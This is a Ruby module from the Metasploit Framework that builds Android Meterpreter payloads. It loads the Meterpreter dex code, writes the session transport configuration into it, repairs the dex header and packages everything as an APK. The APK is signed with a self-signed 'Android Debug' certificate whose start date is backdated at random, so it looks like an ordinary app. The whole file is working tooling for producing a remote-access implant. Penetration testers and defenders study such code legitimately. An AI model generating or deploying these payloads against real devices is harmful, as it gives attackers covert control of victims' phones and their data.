# -*- coding: binary -*-
require 'msf/core'
require 'msf/core/payload/uuid/options'
require 'msf/core/payload/transport_config'
require 'rex/payloads/meterpreter/config'

module Msf::Payload::Android

  include Msf::Payload::TransportConfig
  include Msf::Payload::UUID::Options

  #
  # Fix the dex header checksum and signature
  # http://source.android.com/tech/dalvik/dex-format.html
  #
  def fix_dex_header(dexfile)
    dexfile = dexfile.unpack('a8LH40a*')
    dexfile[2] = Digest::SHA1.hexdigest(dexfile[3])
    dexfile[1] = Zlib.adler32(dexfile[2..-1].pack('H40a*'))
    dexfile.pack('a8LH40a*')
  end

  #
  # We could compile the .class files with dx here
  #
  def generate_stage(opts={})
  end

  #
  # Used by stagers to construct the payload jar file as a String
  #
  def generate
    generate_jar.pack
  end

  def java_string(str)
    [str.length].pack("N") + str
  end

  def apply_options(classes, opts)
    config = generate_config_bytes(opts)
    if opts[:stageless]
      config[0] = "\x01"
    end

    string_sub(classes, "\xde\xad\xba\xad" + "\x00" * 8191, config)
  end

  def generate_config_bytes(opts={})
    opts[:uuid] ||= generate_payload_uuid

    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: datastore['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: [transport_config(opts)]
    }

    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
    config.to_b
  end

  def string_sub(data, placeholder="", input="")
    data.gsub!(placeholder, input + "\x00" * (placeholder.length - input.length))
  end

  def sign_jar(jar)
    x509_name = OpenSSL::X509::Name.parse(
      "C=US/O=Android/CN=Android Debug"
    )
    key  = OpenSSL::PKey::RSA.new(2048)
    cert = OpenSSL::X509::Certificate.new
    cert.version = 2
    cert.serial = 1
    cert.subject = x509_name
    cert.issuer = x509_name
    cert.public_key = key.public_key

    # Some time within the last 3 years
    cert.not_before = Time.now - rand(3600*24*365*3)

    # From http://developer.android.com/tools/publishing/app-signing.html
    # """
    # A validity period of more than 25 years is recommended.
    #
    # If you plan to publish your application(s) on Google Play, note
    # that a validity period ending after 22 October 2033 is a
    # requirement. You cannot upload an application if it is signed
    # with a key whose validity expires before that date.
    # """
    cert.not_after = cert.not_before + 3600*24*365*20 # 20 years

    # If this line is left out, signature verification fails on OSX.
    cert.sign(key, OpenSSL::Digest::SHA1.new)

    jar.sign(key, cert, [cert])
  end

  def generate_jar(opts={})
    if opts[:stageless]
      classes = MetasploitPayloads.read('android', 'meterpreter.dex')
    else
      classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
    end

    apply_options(classes, opts)

    jar = Rex::Zip::Jar.new
    files = [
      [ "AndroidManifest.xml" ],
      [ "resources.arsc" ]
    ]
    jar.add_files(files, MetasploitPayloads.path("android", "apk"))
    jar.add_file("classes.dex", fix_dex_header(classes))
    jar.build_manifest

    sign_jar(jar)

    jar
  end


end

